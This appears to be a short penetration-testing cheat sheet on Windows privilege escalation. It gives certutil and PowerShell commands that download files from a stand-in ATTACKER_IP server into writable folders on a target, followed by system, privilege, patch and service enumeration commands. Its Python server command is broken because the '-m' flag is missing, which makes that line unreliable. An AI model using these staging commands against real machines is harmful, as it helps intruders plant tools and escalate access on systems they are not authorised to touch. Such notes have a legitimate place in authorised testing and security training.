# Windows Privilege Escalation

## Helpers

### Getting files to the target

#### Python HTTP server
```bash
# Attacker machine, in dir of file
python3 http.server PORT

# Target machine in CMD
certutil -urlcache -split -f http://ATTACKER_IP:PORT/FILE DEST
powershell -c "wget http://ATTACKER_IP:PORT/FILE" -outfile "DEST"
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:PORT/FILE' -OutFile 'DEST'"

# possible locations
- C:\Users\Public
- C:\Windows\Temp
```

## Thought process

### Local enumeration

#### Systeminfo and privileges
```cmd
systeminfo
whoami /all
whoami /priv
wmic qfe list brief /format:table
```

#### Services
- List all running services
    ```cmd
    :: List all infomration
    sc query

    :: Filter for names
    sc query | findstr "SERVICE_NAME"
    ```
